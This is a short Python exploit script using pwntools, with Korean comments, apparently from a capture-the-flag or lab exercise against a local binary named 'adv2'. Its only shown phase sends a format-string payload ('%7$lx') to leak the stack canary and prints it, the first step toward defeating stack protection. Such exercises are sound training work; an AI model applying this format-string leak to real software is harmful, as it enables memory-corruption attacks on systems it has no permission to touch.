from pwn import *    # pwntools 라이브러리

p = process('./adv2')

# Phase 1: canary leak
p.sendlineafter(b'name? ', b'%7$lx')   # offset은 직접 찾을 것
canary = int(p.recvline().strip(), 16)
print(f"Leaked canary: {hex(canary)}")